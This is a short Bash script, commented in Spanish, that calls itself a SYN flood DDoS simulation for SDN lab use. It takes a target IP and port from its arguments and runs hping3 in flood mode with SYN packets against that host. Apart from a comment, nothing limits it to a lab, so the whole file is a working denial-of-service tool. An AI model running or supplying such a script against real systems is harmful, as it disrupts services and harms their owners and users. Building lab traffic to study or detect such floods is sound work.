#!/bin/bash

# =====================================================
# Simulación de DDoS SYN Flood
# Uso exclusivo en entorno de laboratorio (SDN)
# =====================================================

TARGET_IP=$1
TARGET_PORT=$2

if [ -z "$TARGET_IP" ] || [ -z "$TARGET_PORT" ]; then
    echo "Uso: ./ddos_syn_flood.sh <IP_objetivo> <puerto>"
    exit 1
fi

echo "Iniciando simulación SYN Flood hacia $TARGET_IP:$TARGET_PORT"

# Envío de paquetes SYN
hping3 -S --flood -V -p $TARGET_PORT $TARGET_IP
